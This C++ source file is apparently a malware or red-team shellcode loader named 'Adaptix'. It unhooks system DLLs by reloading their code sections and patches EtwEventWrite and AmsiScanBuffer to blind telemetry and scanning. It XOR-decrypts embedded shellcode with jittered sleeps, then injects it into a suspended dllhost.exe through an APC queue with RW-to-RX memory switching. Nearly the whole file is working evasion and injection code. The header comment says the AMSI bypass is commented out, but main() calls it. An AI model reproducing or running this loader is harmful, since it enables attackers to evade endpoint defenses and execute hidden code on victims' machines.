// ============ ADAPTIX SHELLCODE LOADER ============
//
// 1. DLL UNHOOKING        -> reload .text of ntdll/kernel32/kernelbase/advapi32
// 2. TELEMETRY BYPASSES   -> ETW (EtwEventWrite = ret) ; AMSI commented out
// 3. SHELLCODE DECRYPTION -> multi-byte XOR, chunked
// 4. PROCESS CREATION     -> suspended dllhost.exe (plausible args)
// 5. INJECTION            -> APC queue + RW->RX (no RWX, no context hijack)
//
// ============ END LOADER ============

#include <cwchar>
#include <exception>
#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdio.h>
#include <vector>
#include <string>

// Data injected at build time by xor_crypt_replacer_v1.py
unsigned char g_shellcode[] = {
/* @@SHELLCODE@@ */
    0x00
};
const SIZE_T g_shellcode_len = sizeof(g_shellcode);

unsigned char g_xor_key[] = {
/* @@XORKEY@@ */
    0x00
};
const SIZE_T g_xor_key_len = sizeof(g_xor_key);

#define CHUNK_SIZE 4096


// Utilities

static bool readWholeFile(const wchar_t* path, std::vector<BYTE>& out)
{
    HANDLE h = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE)
        return false;

    LARGE_INTEGER size = {};
    if (!GetFileSizeEx(h, &size)) { CloseHandle(h); return false; }

    out.resize((size_t)size.QuadPart);
    DWORD read = 0;
    BOOL ok = ReadFile(h, out.data(), (DWORD)out.size(), &read, NULL);
    CloseHandle(h);
    return ok && read == out.size();
}


// 1. DLL UNHOOKING

static void unhookModule(const wchar_t* moduleName)
{
    HMODULE loaded = GetModuleHandleW(moduleName);
    if (!loaded)
        return;

    wchar_t sysdir[MAX_PATH] = {};
    GetSystemDirectoryW(sysdir, MAX_PATH);

    wchar_t path[MAX_PATH] = {};
    _snwprintf_s(path, MAX_PATH, _TRUNCATE, L"%s\\%s", sysdir, moduleName);

    std::vector<BYTE> fresh;
    if (!readWholeFile(path, fresh) || fresh.size() < sizeof(IMAGE_DOS_HEADER))
        return;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)fresh.data();
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
        return;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(fresh.data() + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE)
        return;

    BYTE* base = (BYTE*)loaded;
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (memcmp(sec->Name, ".text", 5) == 0) {
            DWORD oldProt = 0;
            VirtualProtect(base + sec->VirtualAddress, sec->Misc.VirtualSize,
                           PAGE_EXECUTE_READWRITE, &oldProt);
            memcpy(base + sec->VirtualAddress,
                   fresh.data() + sec->PointerToRawData,
                   sec->SizeOfRawData);
            VirtualProtect(base + sec->VirtualAddress, sec->Misc.VirtualSize,
                           oldProt, &oldProt);
            break;
        }
    }
}

// 2. TELEMETRY BYPASSES
static void bypassEtw()
{
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return;

    PVOID target = (PVOID)GetProcAddress(ntdll, "EtwEventWrite");
    if (!target) return;

    DWORD oldProt = 0;
    VirtualProtect(target, 8, PAGE_EXECUTE_READWRITE, &oldProt);
    // xor eax,eax ; ret  -> return STATUS_SUCCESS (0)
    BYTE patch[] = { 0x33, 0xC0, 0xC3 };
    memcpy(target, patch, sizeof(patch));
    VirtualProtect(target, 8, oldProt, &oldProt);
}

// Enable by uncommenting the call in main()
static void bypassAmsi()
{
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return;

    PVOID target = (PVOID)GetProcAddress(amsi, "AmsiScanBuffer");
    if (!target) return;

    DWORD oldProt = 0;
    VirtualProtect(target, 8, PAGE_EXECUTE_READWRITE, &oldProt);
    // mov eax, 0x80070057 ; ret   (E_INVALIDARG -> "not scanned")
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    memcpy(target, patch, sizeof(patch));
    VirtualProtect(target, 8, oldProt, &oldProt);
}


// 3. XOR DECRYPTION (chunked)
static void xorDecryptChunked(unsigned char* buf, SIZE_T len,
                                const unsigned char* key, SIZE_T keyLen)
{
    srand((unsigned)GetTickCount64());

    for (SIZE_T off = 0; off < len; off += CHUNK_SIZE) {
        SIZE_T n = (len - off < CHUNK_SIZE) ? (len - off) : CHUNK_SIZE;
        for (SIZE_T i = 0; i < n; i++)
            buf[off + i] ^= key[(off + i) % keyLen];

        if (off + n < len)
            Sleep(30 + (DWORD)(rand() % 20)); // 30–50 ms                       // let the chunk settle
    }
}


// Main

int main()
{
    // --- 1. Unhooking ---
    unhookModule(L"ntdll.dll");
    unhookModule(L"kernel32.dll");
    unhookModule(L"kernelbase.dll");
    unhookModule(L"advapi32.dll");

    // --- 2. Telemetry ---
    bypassEtw();
    bypassAmsi();

    // --- 3. Decryption ---
    xorDecryptChunked(g_shellcode, g_shellcode_len, g_xor_key, g_xor_key_len);

    // --- 4. Process creation (suspended dllhost) ---
    wchar_t sysdir[MAX_PATH] = {};
    GetSystemDirectoryW(sysdir, MAX_PATH);

    // lpApplicationName separeted : can add args without breaking path 
    wchar_t appPath[MAX_PATH] = {};
    _snwprintf_s(appPath, MAX_PATH, _TRUNCATE, L"%s\\dllhost.exe", sysdir);

    // mutable command lign (CreateProcessW can write it)
    wchar_t cmdline[MAX_PATH + 64] = {};
    _snwprintf_s(cmdline, MAX_PATH + 64, _TRUNCATE,
                 L"\"%s\" /Processid:{%08x-0000-0000-0000-000000000000}",
                 appPath, GetCurrentProcessId());

    STARTUPINFOW si = {};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {};

    if (!CreateProcessW(appPath, cmdline, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi))
        return 1;

    // --- 5. Injection via APC, RW -> RX (no RWX, no context hijacking) ---
    LPVOID remote = VirtualAllocEx(pi.hProcess, NULL, g_shellcode_len,
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_READWRITE);          // RW d'abord
    if (!remote) {
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    if (!WriteProcessMemory(pi.hProcess, remote, g_shellcode, g_shellcode_len, NULL)) {
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    // Switch in RX : page begin executable but not inscriptible
    DWORD oldProt = 0;
    if (!VirtualProtectEx(pi.hProcess, remote, g_shellcode_len,
                          PAGE_EXECUTE_READ, &oldProt)) {
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    // APC on principal thread
    QueueUserAPC((PAPCFUNC)remote, pi.hThread, 0);
    ResumeThread(pi.hThread);

    // --- 6. Monitoring ---
    while (true)
    {
        DWORD exitCode;
        GetExitCodeProcess(pi.hProcess, &exitCode);
        if (exitCode == STILL_ACTIVE)
        {
            wprintf(L"[+] Process is still running....\n");
            Sleep(5000);
        }
        else
        {
            wprintf(L"[-] Process <dllhost.exe> encountered an external error (code %lu), go to eventvwr.msc\n", exitCode);
            Sleep(4000);
            break;
        }
    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
